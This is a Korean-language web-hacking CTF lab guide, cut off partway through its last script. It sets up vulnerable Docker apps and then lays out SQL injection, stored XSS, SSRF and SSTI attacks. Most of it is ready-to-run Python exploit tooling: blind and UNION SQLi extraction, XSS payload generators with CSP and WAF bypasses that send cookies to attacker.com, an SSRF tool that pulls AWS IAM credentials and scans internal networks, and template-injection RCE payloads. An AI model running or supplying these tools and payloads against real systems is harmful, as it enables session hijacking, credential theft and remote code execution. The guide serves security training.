# 웹 해킹 CTF 실습 랩 — SQL 인젝션·XSS·SSRF·SSTI 종합

## 1. 실습 환경 설정

### 1.1 Docker 기반 취약 웹앱 구축

```bash
# DVWA (Damn Vulnerable Web Application)
docker pull vulnerables/web-dvwa
docker run -d -p 8080:80 vulnerables/web-dvwa

# WebGoat
docker pull webgoat/goat-and-wolf
docker run -d -p 8888:8080 webgoat/goat-and-wolf

# OWASP Juice Shop
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# 전체 스택 한번에 올리기 (docker-compose)
# docker-compose.yml 예시:
cat > docker-compose.yml << 'EOF'
version: "3.9"
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports: ["8080:80"]
  webgoat:
    image: webgoat/goat-and-wolf
    ports: ["8888:8080"]
  juiceshop:
    image: bkimminich/juice-shop
    ports: ["3000:3000"]
  attacker:
    image: kalilinux/kali-rolling
    tty: true
    stdin_open: true
    network_mode: host
EOF
docker compose up -d
```

### 1.2 실습 도구 목록

| 도구 | 용도 | 설치 명령 | 버전 |
|------|------|-----------|------|
| sqlmap | SQL 인젝션 자동 탐지/익스플로잇 | `pip install sqlmap` | 1.7+ |
| Burp Suite Community | HTTP 프록시·인터셉트·Repeater | 공식 사이트 다운로드 | 2024.x |
| ffuf | 웹 디렉토리·파라미터 퍼징 | `go install github.com/ffuf/ffuf/v2@latest` | 2.x |
| nuclei | 취약점 템플릿 기반 스캐너 | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` | 3.x |
| httpx | HTTP 빠른 프로브 | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` | 1.x |
| wfuzz | 웹 퍼징 (쿠키·헤더 포함) | `pip install wfuzz` | 3.x |
| caido | 차세대 Burp 대안 | 공식 사이트 다운로드 | 최신 |
| hakrawler | 크롤러·엔드포인트 수집 | `go install github.com/hakluke/hakrawler@latest` | 최신 |

### 1.3 Burp Suite 프록시 설정

```bash
# Firefox용 프록시 설정 (127.0.0.1:8080)
# CA 인증서 설치: http://burpsuite → Download CA Certificate

# CLI 환경에서 curl 프록시 지정
curl -x http://127.0.0.1:8080 -k https://target.com/

# httpie 프록시
http --proxy=http:http://127.0.0.1:8080 GET https://target.com/
```

---

## 2. CTF 문제 1: SQL 인젝션으로 플래그 추출

### 2.1 시나리오 설명

```
목표: 로그인 우회 후 UNION 기반 SQLi로 플래그 테이블 조회
대상: http://localhost:8080/login.php
취약 파라미터: username, password (POST)
DBMS: MySQL 5.7
플래그 위치: flag 테이블의 secret 컬럼
```

### 2.2 단계별 공격 절차

**Step 1: 취약점 확인 (에러 기반)**

```
username: admin' --
password: anything

→ SQL: SELECT * FROM users WHERE username='admin' -- ' AND password='...'
→ 로그인 성공 또는 SQL 에러 노출
```

**Step 2: 컬럼 수 파악**

```
username: ' ORDER BY 1-- -
username: ' ORDER BY 2-- -
username: ' ORDER BY 3-- -   ← 에러 발생 시 컬럼 수 = 2
```

**Step 3: UNION SELECT로 데이터 추출**

```
username: ' UNION SELECT 1,2-- -
username: ' UNION SELECT database(),user()-- -
username: ' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
username: ' UNION SELECT secret,2 FROM flag-- -
```

**Step 4: 블라인드 SQLi (에러 미노출 시)**

```
# Boolean 기반
username: ' AND (SELECT SUBSTRING(secret,1,1) FROM flag LIMIT 1)='F'-- -

# 시간 기반
username: ' AND IF((SELECT SUBSTRING(secret,1,1) FROM flag LIMIT 1)='F', SLEEP(3), 0)-- -
```

### 2.3 Python CLI: SQLi 자동 탐지 + 익스플로잇

```python
#!/usr/bin/env python3
"""
SQLi CTF 익스플로잇 도구
사용법:
  python sqli_exploit.py --url http://localhost:8080/login.php \
                          --param username \
                          --technique union
  python sqli_exploit.py --url http://localhost:8080/login.php \
                          --param username \
                          --technique blind \
                          --workers 10
"""

import argparse
import sys
import string
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional


HEADERS = {
    "User-Agent": "Mozilla/5.0 (CTF-Lab/1.0)",
    "Content-Type": "application/x-www-form-urlencoded",
}

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()",
    "sqlite_",
    "ora-",
]


@dataclass
class SqliConfig:
    url: str
    param: str
    technique: str
    workers: int = 5
    timeout: int = 10
    data: dict[str, str] = field(default_factory=dict)
    cookies: dict[str, str] = field(default_factory=dict)
    target_table: str = "flag"
    target_column: str = "secret"


def detect_sqli(cfg: SqliConfig) -> bool:
    """에러 기반 SQLi 탐지."""
    payloads = ["'", '"', "' OR '1'='1", "' OR 1=1--"]
    session = requests.Session()
    session.headers.update(HEADERS)

    for payload in payloads:
        data = dict(cfg.data)
        data[cfg.param] = payload
        try:
            resp = session.post(cfg.url, data=data, timeout=cfg.timeout,
                                cookies=cfg.cookies)
            body = resp.text.lower()
            for sig in ERROR_SIGNATURES:
                if sig in body:
                    print(f"[+] SQL 에러 탐지: '{sig}' (payload: {payload!r})")
                    return True
        except requests.RequestException as e:
            print(f"[-] 요청 실패: {e}", file=sys.stderr)

    print("[*] 에러 기반 탐지 실패 → Blind 모드 시도 권장")
    return False


def union_exploit(cfg: SqliConfig) -> Optional[str]:
    """UNION SELECT 기반 데이터 추출."""
    session = requests.Session()
    session.headers.update(HEADERS)

    # 컬럼 수 파악
    col_count = 0
    for n in range(1, 11):
        order_payload = f"' ORDER BY {n}-- -"
        data = dict(cfg.data)
        data[cfg.param] = order_payload
        try:
            resp = session.post(cfg.url, data=data, timeout=cfg.timeout,
                                cookies=cfg.cookies)
            body = resp.text.lower()
            if any(sig in body for sig in ERROR_SIGNATURES):
                col_count = n - 1
                break
        except requests.RequestException:
            pass

    if col_count == 0:
        col_count = 2  # 기본값
    print(f"[*] 컬럼 수: {col_count}")

    # UNION SELECT로 플래그 추출
    nulls = ",".join(["NULL"] * (col_count - 1))
    payload = (
        f"' UNION SELECT {cfg.target_column}"
        + (f",{nulls}" if nulls else "")
        + f" FROM {cfg.target_table}-- -"
    )
    data = dict(cfg.data)
    data[cfg.param] = payload

    try:
        resp = session.post(cfg.url, data=data, timeout=cfg.timeout,
                            cookies=cfg.cookies)
        print(f"[+] UNION 응답 수신 (길이: {len(resp.text)})")
        # 플래그 패턴 탐색
        import re
        flags = re.findall(r"(?:CTF|FLAG|flag)\{[^}]+\}", resp.text)
        if flags:
            return flags[0]
        return resp.text[:500]  # 플래그 패턴 없으면 앞부분 반환
    except requests.RequestException as e:
        print(f"[-] UNION 익스플로잇 실패: {e}", file=sys.stderr)
        return None


def blind_check_char(cfg: SqliConfig, session: requests.Session,
                     pos: int, char: str) -> bool:
    """Blind SQLi 단일 문자 확인 (Boolean 기반)."""
    payload = (
        f"' AND (SELECT SUBSTRING({cfg.target_column},{pos},1) "
        f"FROM {cfg.target_table} LIMIT 1)='{char}'-- -"
    )
    data = dict(cfg.data)
    data[cfg.param] = payload
    try:
        resp = session.post(cfg.url, data=data, timeout=cfg.timeout,
                            cookies=cfg.cookies)
        # 로그인 성공 여부로 참/거짓 판별 (응답 길이 또는 키워드)
        return "welcome" in resp.text.lower() or resp.status_code == 302
    except requests.RequestException:
        return False


def blind_time_check_char(cfg: SqliConfig, session: requests.Session,
                           pos: int, char: str) -> bool:
    """시간 기반 Blind SQLi 단일 문자 확인."""
    payload = (
        f"' AND IF((SELECT SUBSTRING({cfg.target_column},{pos},1) "
        f"FROM {cfg.target_table} LIMIT 1)='{char}',SLEEP(2),0)-- -"
    )
    data = dict(cfg.data)
    data[cfg.param] = payload
    try:
        start = time.time()
        session.post(cfg.url, data=data, timeout=cfg.timeout + 3,
                     cookies=cfg.cookies)
        elapsed = time.time() - start
        return elapsed >= 2.0
    except requests.RequestException:
        return False


def blind_exploit(cfg: SqliConfig) -> Optional[str]:
    """Blind SQLi로 플래그 추출 (병렬화 지원)."""
    charset = string.printable.strip()
    session = requests.Session()
    session.headers.update(HEADERS)

    result = []
    max_len = 64

    print(f"[*] Blind SQLi 시작 (workers={cfg.workers})")

    for pos in range(1, max_len + 1):
        found_char: Optional[str] = None

        with ThreadPoolExecutor(max_workers=cfg.workers) as executor:
            future_to_char = {
                executor.submit(
                    blind_check_char, cfg, session, pos, ch
                ): ch
                for ch in charset
            }
            for future in as_completed(future_to_char):
                ch = future_to_char[future]
                try:
                    if future.result():
                        found_char = ch
                        # 나머지 future 취소
                        for f in future_to_char:
                            f.cancel()
                        break
                except Exception:
                    pass

        if found_char is None:
            print(f"\n[*] 위치 {pos}에서 문자 미발견 → 추출 완료")
            break

        result.append(found_char)
        sys.stdout.write(f"\r[+] 진행: {''.join(result)}")
        sys.stdout.flush()

        # 플래그 닫힘 감지
        if found_char == "}":
            break

    print()
    return "".join(result) if result else None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SQLi CTF 익스플로잇 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--url", required=True, help="대상 URL")
    parser.add_argument("--param", required=True, help="취약 파라미터 이름")
    parser.add_argument(
        "--technique",
        choices=["union", "blind", "time"],
        default="union",
        help="익스플로잇 기법 (기본: union)",
    )
    parser.add_argument("--data", default="", help="추가 POST 데이터 (key=val&key2=val2)")
    parser.add_argument("--cookie", default="", help="쿠키 문자열")
    parser.add_argument("--workers", type=int, default=5, help="Blind SQLi 병렬 워커 수")
    parser.add_argument("--table", default="flag", help="대상 테이블 (기본: flag)")
    parser.add_argument("--column", default="secret", help="대상 컬럼 (기본: secret)")
    parser.add_argument("--detect-only", action="store_true", help="탐지만 수행")

    args = parser.parse_args()

    # 데이터 파싱
    extra_data: dict[str, str] = {}
    if args.data:
        for kv in args.data.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                extra_data[k] = v

    cookies: dict[str, str] = {}
    if args.cookie:
        for kv in args.cookie.split(";"):
            kv = kv.strip()
            if "=" in kv:
                k, v = kv.split("=", 1)
                cookies[k] = v

    cfg = SqliConfig(
        url=args.url,
        param=args.param,
        technique=args.technique,
        workers=args.workers,
        data=extra_data,
        cookies=cookies,
        target_table=args.table,
        target_column=args.column,
    )

    print(f"[*] 대상: {cfg.url}")
    print(f"[*] 파라미터: {cfg.param}")
    print(f"[*] 기법: {cfg.technique}")

    # 취약점 탐지
    detected = detect_sqli(cfg)

    if args.detect_only:
        sys.exit(0 if detected else 1)

    if not detected:
        print("[!] SQLi 탐지 실패, 계속 진행합니다...")

    # 익스플로잇
    flag: Optional[str] = None
    match cfg.technique:
        case "union":
            flag = union_exploit(cfg)
        case "blind":
            flag = blind_exploit(cfg)
        case "time":
            # 시간 기반은 blind_exploit 내 time_check 활용
            flag = blind_exploit(cfg)

    if flag:
        print(f"\n[+] 추출 결과: {flag}")
    else:
        print("[-] 플래그 추출 실패")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

---

## 3. CTF 문제 2: Stored XSS → 세션 탈취

### 3.1 취약점 식별 → 페이로드 작성 → 쿠키 탈취 흐름

```
1. 입력 필드 탐색: 게시판 본문, 댓글, 닉네임, 프로필 등
2. 기본 페이로드 삽입: <script>alert(1)</script>
3. 필터 우회: 대소문자, 태그 변형, 이벤트 핸들러 활용
4. 쿠키 탈취 페이로드 삽입 (공격자 서버로 전송)
5. 관리자가 해당 페이지 방문 시 쿠키 수신
6. 수신된 세션 쿠키로 관리자 계정 탈취
```

### 3.2 CSP 우회 기법

| CSP 정책 | 우회 기법 | 예시 페이로드 |
|----------|-----------|---------------|
| `script-src 'self'` | JSONP 엔드포인트 악용 | `<script src="/api/jsonp?callback=alert(1)//"></script>` |
| `script-src 'nonce-xxx'` | nonce 재사용 탐지 | DOM에서 nonce 추출 후 동적 삽입 |
| `script-src cdn.example.com` | 신뢰 도메인 내 업로드 | CDN에 JS 업로드 후 참조 |
| `default-src 'none'` | 메타 리다이렉트 | `<meta http-equiv="refresh" content="0;url=...">` |
| `unsafe-inline` 없음 | DOM XSS 경유 | hash fragment → innerHTML |

**쿠키 탈취 페이로드 예시**

```html
<!-- 기본 fetch 기반 -->
<script>
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
</script>

<!-- img 태그 기반 (CSP script-src 우회) -->
<img src=x onerror="this.src='https://attacker.com/steal?c='+document.cookie">

<!-- SVG 기반 -->
<svg onload="fetch('https://attacker.com/steal?c='+document.cookie)">

<!-- iframe srcdoc -->
<iframe srcdoc="<script>parent.fetch('https://attacker.com/steal?c='+parent.document.cookie)<\/script>">
```

**공격자 수신 서버 (간단한 예)**

```python
# 쿠키 수신 서버 (nc 또는 간단한 HTTP 서버)
python3 -m http.server 8000
# 또는
nc -lvnp 8000
```

### 3.3 Python CLI: XSS 페이로드 생성기

```python
#!/usr/bin/env python3
"""
XSS 페이로드 생성기
사용법:
  python xss_payload_gen.py --type reflected --bypass csp
  python xss_payload_gen.py --type stored --bypass filter --receiver http://attacker.com/steal
  python xss_payload_gen.py --type dom --bypass waf --output payloads.txt
"""

import argparse
import sys
import base64
import urllib.parse
from typing import Iterator


PayloadList = list[str]


def generate_reflected_payloads(bypass: str, receiver: str) -> PayloadList:
    """Reflected XSS 페이로드 생성."""
    base = f"fetch('{receiver}?c='+document.cookie)"
    payloads: PayloadList = []

    match bypass:
        case "csp":
            payloads = [
                f'<script src="/api/jsonp?callback={base}//"></script>',
                f'<script nonce="INJECT">{base}</script>',
                f'<link rel=preload as=script href="data:,{base}">',
                f'<object data="data:text/html,<script>{base}</script>">',
            ]
        case "filter":
            encoded = base64.b64encode(base.encode()).decode()
            payloads = [
                f'<ScRiPt>{base}</ScRiPt>',
                f'<script>{base}</SCRIPT>',
                f'<scr<script>ipt>{base}</script>',
                f'<img src=x onerror="{base}">',
                f'<svg/onload="{base}">',
                f'<body onload="{base}">',
                f'<details open ontoggle="{base}">',
                f'jaVasCript:{base}',
            ]
        case "waf":
            url_enc = urllib.parse.quote(base)
            payloads = [
                f'<img src=x onerror=eval(atob("{base64.b64encode(base.encode()).decode()}"))>',
                f'<svg><animate onbegin="{base}" attributeName=x dur=1s>',
                f'<input autofocus onfocus="{base}">',
                f'<select onfocus="{base}" autofocus>',
                f'<textarea onfocus="{base}" autofocus>',
                f'<!--<img src="--><img src=x onerror={base}//">',
            ]
        case _:
            payloads = [
                f'<script>{base}</script>',
                f'<img src=x onerror="{base}">',
            ]

    return payloads


def generate_stored_payloads(bypass: str, receiver: str) -> PayloadList:
    """Stored XSS 페이로드 생성."""
    steal = f"new Image().src='{receiver}?c='+encodeURIComponent(document.cookie)"
    payloads: PayloadList = []

    match bypass:
        case "csp":
            payloads = [
                f'<script>{steal}</script>',
                f'<svg><script>{steal}</script></svg>',
                f'<math><maction xlink:href="javascript:{steal}">click</maction></math>',
                f'<iframe onload="{steal}">',
            ]
        case "filter":
            # HTML 엔티티 인코딩 우회
            encoded_payload = steal.replace("<", "&lt;").replace(">", "&gt;")
            payloads = [
                f'<img src=1 onerror=\\u0065val(`{steal}`)>',
                f'<script>\\u0065val("{steal}")</script>',
                f'<img/src/onerror="{steal}">',
                f'<video><source onerror="{steal}">',
                f'<audio src=x onerror="{steal}">',
            ]
        case "waf":
            b64 = base64.b64encode(steal.encode()).decode()
            payloads = [
                f'<img src=x onerror="eval(atob(\'{b64}\'))">',
                f'<svg onload="[].constructor.constructor(\'{steal}\')()">',
                f'<iframe srcdoc="&lt;script&gt;{steal}&lt;/script&gt;">',
                f'<object data="javascript:{steal}">',
            ]
        case _:
            payloads = [
                f'<script>{steal}</script>',
                f'<img src=x onerror="{steal}">',
            ]

    return payloads


def generate_dom_payloads(bypass: str, receiver: str) -> PayloadList:
    """DOM XSS 페이로드 생성."""
    steal = f"fetch('{receiver}?c='+document.cookie)"
    payloads: PayloadList = []

    match bypass:
        case "csp":
            payloads = [
                f'#"><img src=x onerror="{steal}">',
                f'javascript:{steal}',
                f'data:text/html,<script>{steal}</script>',
            ]
        case "filter":
            payloads = [
                f'#<script>{steal}</script>',
                f'#{steal}',
                f'#"><svg onload="{steal}">',
                f"#';{steal}//",
            ]
        case "waf":
            b64 = base64.b64encode(steal.encode()).decode()
            payloads = [
                f'#\'+eval(atob(\'{b64}\'))+\'',
                f'#"><img src=x onerror=eval(atob(`{b64}`))>',
            ]
        case _:
            payloads = [
                f'#"><script>{steal}</script>',
                f'#"><img src=x onerror="{steal}">',
            ]

    return payloads


def iter_all_payloads(xss_type: str, bypass: str, receiver: str) -> Iterator[str]:
    """타입에 따른 페이로드 이터레이터."""
    generators = {
        "reflected": generate_reflected_payloads,
        "stored": generate_stored_payloads,
        "dom": generate_dom_payloads,
    }
    gen_fn = generators.get(xss_type)
    if gen_fn is None:
        raise ValueError(f"알 수 없는 타입: {xss_type}")
    yield from gen_fn(bypass, receiver)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="XSS 페이로드 생성기",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--type",
        choices=["reflected", "stored", "dom"],
        required=True,
        help="XSS 유형",
    )
    parser.add_argument(
        "--bypass",
        choices=["csp", "filter", "waf", "none"],
        default="none",
        help="우회 기법 (기본: none)",
    )
    parser.add_argument(
        "--receiver",
        default="http://attacker.com/steal",
        help="쿠키 수신 URL",
    )
    parser.add_argument(
        "--output",
        default="",
        help="결과 파일 경로 (없으면 stdout)",
    )

    args = parser.parse_args()

    payloads = list(iter_all_payloads(args.type, args.bypass, args.receiver))

    if not payloads:
        print("[-] 생성된 페이로드 없음", file=sys.stderr)
        sys.exit(1)

    lines = [f"# XSS 페이로드 — type={args.type}, bypass={args.bypass}"]
    lines += [f"# receiver={args.receiver}", ""]
    lines += payloads

    output = "\n".join(lines)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as fh:
            fh.write(output + "\n")
        print(f"[+] {len(payloads)}개 페이로드 저장: {args.output}")
    else:
        print(output)


if __name__ == "__main__":
    main()
```

---

## 4. CTF 문제 3: SSRF로 내부 AWS 메타데이터 접근

### 4.1 SSRF 탐지 → 내부 네트워크 스캔 → 메타데이터 추출

**SSRF 탐지 단계**

```
1. URL 파라미터가 있는 엔드포인트 탐색:
   /fetch?url=, /proxy?target=, /preview?link=, /webhook?endpoint=

2. 외부 콜백 서버 준비 (Burp Collaborator, interactsh):
   interactsh-client -server interactsh.com

3. 기본 SSRF 테스트:
   /fetch?url=http://your-interactsh-domain.com/

4. 내부 주소 탐색:
   /fetch?url=http://127.0.0.1/
   /fetch?url=http://localhost/
   /fetch?url=http://169.254.169.254/  ← AWS 메타데이터
   /fetch?url=http://192.168.1.1/
```

**AWS 메타데이터 추출 경로**

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
→ AccessKeyId, SecretAccessKey, Token 획득

# IMDSv2 (토큰 필요)
PUT http://169.254.169.254/latest/api/token
  X-aws-ec2-metadata-token-ttl-seconds: 21600
→ TOKEN 수신 후
GET http://169.254.169.254/latest/meta-data/
  X-aws-ec2-metadata-token: <TOKEN>
```

**SSRF 우회 기법**

```
# IP 표현 변환
http://2130706433/          ← 127.0.0.1 10진수
http://0x7f000001/          ← 127.0.0.1 16진수
http://0177.0.0.1/          ← 127.0.0.1 8진수
http://[::1]/               ← IPv6 루프백
http://127.1/               ← 축약형

# DNS 리바인딩
# 1차 DNS 응답: 공격자 서버 IP
# 2차 DNS 응답: 127.0.0.1 (재질의 시점)

# URL 파싱 혼동
http://attacker.com@169.254.169.254/
http://169.254.169.254#attacker.com
```

### 4.2 Python CLI: SSRF 익스플로잇 도구

```python
#!/usr/bin/env python3
"""
SSRF 익스플로잇 도구
사용법:
  python ssrf_exploit.py --target-url http://target.com/fetch \
                          --ssrf-param url \
                          --scan-internal
  python ssrf_exploit.py --target-url http://target.com/proxy \
                          --ssrf-param target \
                          --aws-metadata
"""

import argparse
import sys
import ipaddress
import concurrent.futures
from dataclasses import dataclass, field
from typing import Optional
import requests


HEADERS = {"User-Agent": "Mozilla/5.0 (CTF-Lab/1.0)"}

AWS_METADATA_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/hostname",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/public-ipv4",
    "/latest/meta-data/iam/",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/user-data",
]

INTERNAL_PREFIXES = [
    "169.254.169.254",   # AWS 메타데이터
    "10.0.0.",
    "192.168.1.",
    "172.16.0.",
]


@dataclass
class SsrfConfig:
    target_url: str
    ssrf_param: str
    method: str = "GET"
    extra_params: dict[str, str] = field(default_factory=dict)
    cookies: dict[str, str] = field(default_factory=dict)
    timeout: int = 8
    workers: int = 20


def probe_ssrf(cfg: SsrfConfig, internal_url: str) -> Optional[str]:
    """단일 내부 URL SSRF 프로브."""
    session = requests.Session()
    session.headers.update(HEADERS)

    params = dict(cfg.extra_params)
    params[cfg.ssrf_param] = internal_url

    try:
        if cfg.method.upper() == "GET":
            resp = session.get(cfg.target_url, params=params,
                               timeout=cfg.timeout, cookies=cfg.cookies)
        else:
            resp = session.post(cfg.target_url, data=params,
                                timeout=cfg.timeout, cookies=cfg.cookies)

        if resp.status_code == 200 and len(resp.text) > 0:
            return resp.text
        return None
    except requests.RequestException:
        return None


def scan_internal_hosts(cfg: SsrfConfig, subnet: str,
                         port: int = 80) -> list[str]:
    """내부 서브넷 호스트 스캔."""
    live_hosts: list[str] = []
    network = ipaddress.IPv4Network(subnet, strict=False)
    hosts = list(network.hosts())[:254]

    print(f"[*] {subnet} 스캔 중 ({len(hosts)}개 호스트)...")

    def check_host(ip: ipaddress.IPv4Address) -> Optional[str]:
        url = f"http://{ip}:{port}/"
        result = probe_ssrf(cfg, url)
        if result is not None:
            return str(ip)
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=cfg.workers) as ex:
        futures = {ex.submit(check_host, ip): ip for ip in hosts}
        for future in concurrent.futures.as_completed(futures):
            try:
                host = future.result()
                if host:
                    print(f"  [+] 응답 호스트: {host}:{port}")
                    live_hosts.append(host)
            except Exception:
                pass

    return live_hosts


def extract_aws_metadata(cfg: SsrfConfig) -> dict[str, str]:
    """AWS EC2 인스턴스 메타데이터 추출."""
    base = "http://169.254.169.254"
    results: dict[str, str] = {}

    # IMDSv2 토큰 획득 시도
    token: Optional[str] = None
    token_result = probe_ssrf(cfg, f"{base}/latest/api/token")
    if token_result and len(token_result) < 200:
        token = token_result.strip()
        print(f"[+] IMDSv2 토큰 획득: {token[:20]}...")

    for path in AWS_METADATA_PATHS:
        full_url = f"{base}{path}"
        content = probe_ssrf(cfg, full_url)
        if content:
            results[path] = content.strip()
            print(f"[+] {path}: {content.strip()[:80]}")

    # IAM 역할 자격증명 추출
    role_path = "/latest/meta-data/iam/security-credentials/"
    if role_path in results:
        role_name = results[role_path].strip().split("\n")[0]
        cred_url = f"{base}{role_path}{role_name}"
        cred = probe_ssrf(cfg, cred_url)
        if cred:
            results[f"{role_path}{role_name}"] = cred
            print(f"[!] IAM 자격증명 획득!\n{cred}")

    return results


def detect_ssrf_vulnerability(cfg: SsrfConfig) -> bool:
    """SSRF 취약점 탐지 (로컬호스트 응답 확인)."""
    test_urls = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://2130706433/",   # 127.0.0.1 decimal
    ]

    print("[*] SSRF 취약점 탐지 중...")
    for url in test_urls:
        result = probe_ssrf(cfg, url)
        if result is not None:
            print(f"[+] SSRF 탐지 성공: {url}")
            print(f"    응답 미리보기: {result[:100]}")
            return True

    print("[-] SSRF 탐지 실패")
    return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SSRF 익스플로잇 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--target-url", required=True, help="대상 웹 URL")
    parser.add_argument("--ssrf-param", required=True, help="SSRF 취약 파라미터")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--scan-internal", action="store_true",
                        help="내부 네트워크 스캔")
    parser.add_argument("--subnet", default="192.168.1.0/24",
                        help="스캔할 서브넷 (기본: 192.168.1.0/24)")
    parser.add_argument("--aws-metadata", action="store_true",
                        help="AWS 메타데이터 추출")
    parser.add_argument("--port", type=int, default=80, help="스캔 포트 (기본: 80)")
    parser.add_argument("--workers", type=int, default=20, help="병렬 워커 수")
    parser.add_argument("--timeout", type=int, default=8, help="요청 타임아웃(초)")
    parser.add_argument("--data", default="", help="추가 POST 데이터")
    parser.add_argument("--cookie", default="", help="쿠키 문자열")

    args = parser.parse_args()

    extra_params: dict[str, str] = {}
    if args.data:
        for kv in args.data.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                extra_params[k] = v

    cookies: dict[str, str] = {}
    if args.cookie:
        for kv in args.cookie.split(";"):
            kv = kv.strip()
            if "=" in kv:
                k, v = kv.split("=", 1)
                cookies[k] = v

    cfg = SsrfConfig(
        target_url=args.target_url,
        ssrf_param=args.ssrf_param,
        method=args.method,
        extra_params=extra_params,
        cookies=cookies,
        timeout=args.timeout,
        workers=args.workers,
    )

    print(f"[*] 대상: {cfg.target_url}")
    print(f"[*] 파라미터: {cfg.ssrf_param}")

    is_vuln = detect_ssrf_vulnerability(cfg)

    if args.aws_metadata:
        if not is_vuln:
            print("[!] SSRF 미탐지, AWS 메타데이터 추출 시도 강행...")
        results = extract_aws_metadata(cfg)
        print(f"\n[+] 총 {len(results)}개 메타데이터 경로 수집")

    if args.scan_internal:
        if not is_vuln:
            print("[!] SSRF 미탐지, 내부 스캔 시도 강행...")
        live = scan_internal_hosts(cfg, args.subnet, args.port)
        print(f"\n[+] 응답 호스트 {len(live)}개: {live}")


if __name__ == "__main__":
    main()
```

---

## 5. CTF 문제 4: SSTI (Server-Side Template Injection)

### 5.1 Jinja2 / Twig / Mako 탐지 및 RCE

**SSTI 탐지 페이로드 (수식 계산 확인)**

```
# 공통 탐지
{{7*7}}          → 49 (Jinja2, Twig)
${7*7}           → 49 (Mako, Freemarker)
#{7*7}           → 49 (Ruby ERB 아님)
<%= 7*7 %>       → 49 (ERB)
{{7*'7'}}        → 7777777 (Jinja2) / 49 (Twig) ← 엔진 구분 가능
```

**Jinja2 RCE 페이로드**

```python
# 기본 RCE
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()[0] }}

# config 오브젝트 활용
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# 필터 우회 (언더스코어 필터링 시)
{{ request|attr('__class__')|attr('__mro__')|... }}

# 플래그 읽기
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /flag', shell=True, stdout=-1).communicate()[0].decode() }}
```

**Twig RCE 페이로드**

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /flag']|filter('system')}}
```

**Mako RCE 페이로드**

```
<%
import os
x=os.popen('id').read()
%>
${x}
```

### 5.2 Python CLI: SSTI 탐지 및 플래그 추출 자동화

```python
#!/usr/bin/env python3
"""
SSTI 탐지 및 RCE 자동화 스크립트
사용법:
  python ssti_exploit.py --url http://target.com/render \
                          --param name \
                          --engine jinja2
  python ssti_exploit.py --url http://target.com/template \
                          --param input \
                          --detect-only
"""

import argparse
import sys
import re
import requests
from dataclasses import dataclass
from typing import Optional


HEADERS = {"User-Agent": "Mozilla/5.0 (CTF-Lab/1.0)"}


@dataclass
class SstiConfig:
    url: str
    param: str
    method: str = "GET"
    engine: str = "auto"
    timeout: int = 10
    cookies: dict[str, str] | None = None
    extra_data: dict[str, str] | None = None


# 탐지 페이로드: (페이로드, 예상 응답, 엔진 힌트)
DETECT_PAYLOADS: list[tuple[str, str, str]] = [
    ("{{7*7}}", "49", "jinja2/twig"),
    ("${7*7}", "49", "mako/freemarker"),
    ("{{7*'7'}}", "7777777", "jinja2"),
    ("{{7*'7'}}", "49", "twig"),
    ("<%= 7*7 %>", "49", "erb"),
    ("#{7*7}", "49", "unknown"),
]

RCE_PAYLOADS: dict[str, list[str]] = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
    ],
    "twig": [
        "{{['id']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "mako": [
        "<%import os%>${os.popen('id').read()}",
        "${__import__('os').popen('id').read()}",
    ],
    "erb": [
        "<%= `id` %>",
        "<%= system('id') %>",
    ],
    "freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    ],
}


def send_payload(cfg: SstiConfig, payload: str) -> Optional[str]:
    """페이로드 전송 후 응답 반환."""
    session = requests.Session()
    session.headers.update(HEADERS)

    params_or_data = dict(cfg.extra_data or {})
    params_or_data[cfg.param] = payload

    try:
        if cfg.method.upper() == "GET":
            resp = session.get(cfg.url, params=params_or_data,
                               timeout=cfg.timeout,
                               cookies=cfg.cookies or {})
        else:
            resp = session.post(cfg.url, data=params_or_data,
                                timeout=cfg.timeout,
                                cookies=cfg.cookies or {})
        return resp.text
    except requests.RequestException as e:
        print(f"[-] 요청 오류: {e}", file=sys.stderr)
        return None


def detect_engine(cfg: SstiConfig) -> Optional[str]:
    """템플릿 엔진 자동 탐지."""
    print("[*] SSTI 엔진 탐지 중...")

